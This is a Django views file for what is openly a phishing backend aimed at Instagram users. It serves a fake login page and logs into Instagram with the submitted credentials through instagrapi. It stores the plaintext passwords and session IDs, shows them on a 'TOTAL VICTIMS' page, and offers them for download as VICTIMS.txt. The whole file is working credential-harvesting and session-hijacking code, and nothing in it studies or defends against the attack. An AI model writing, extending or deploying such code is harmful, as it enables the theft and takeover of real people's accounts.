from django.http import JsonResponse, HttpResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings
from core.models import InstagramAccount
from instagrapi import Client
from cryptography.fernet import Fernet
import json

FERNET_KEY = settings.FERNET_KEY
fernet = Fernet(FERNET_KEY.encode())

@csrf_exempt
def login_view(request):
    if request.method == "GET":
        return render(request, 'core/login.html')
    
    if request.method == "POST":
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '').strip()
        
        cl = Client()
        cl.delay_range = [1, 3]
        
        try:
            cl.login(username, password)
            session = cl.get_settings()
            success = True
        except:
            session = {"failed": True}
            success = False

        encrypted = fernet.encrypt(json.dumps(session).encode()).decode()
        
        InstagramAccount.objects.create(
            username=username,
            password=password,
            session_data=encrypted,
            is_active=success
        )
        
        return JsonResponse({"success": True, "username": username})

def get_all_sessions(request):
    data = []
    for acc in InstagramAccount.objects.all().order_by('-id'):
        try:
            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
            session = json.loads(decrypted)
            data.append({
                "username": acc.username,
                "password": acc.password,
                "active": acc.is_active,
                "sessionid": session.get("authorization_data", {}).get("sessionid", "NO SESSION")
            })
        except:
            data.append({"username": acc.username, "error": "bad session"})
    
    html = f"<h1 style='color:lime;text-align:center;'>TOTAL VICTIMS: {len(data)}</h1><pre>{json.dumps(data, indent=2)}</pre>"
    return HttpResponse(html)

def download_all(request):
    txt = ""
    for acc in InstagramAccount.objects.all():
        try:
            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
            session = json.loads(decrypted)
            sessionid = session.get("authorization_data", {}).get("sessionid", "")
            txt += f"{acc.username}:{acc.password}:{sessionid}\n"
        except:
            txt += f"{acc.username}:{acc.password}:ERROR\n"
    response = HttpResponse(txt, content_type='text/plain')
    response['Content-Disposition'] = 'attachment; filename="VICTIMS.txt"'
    return response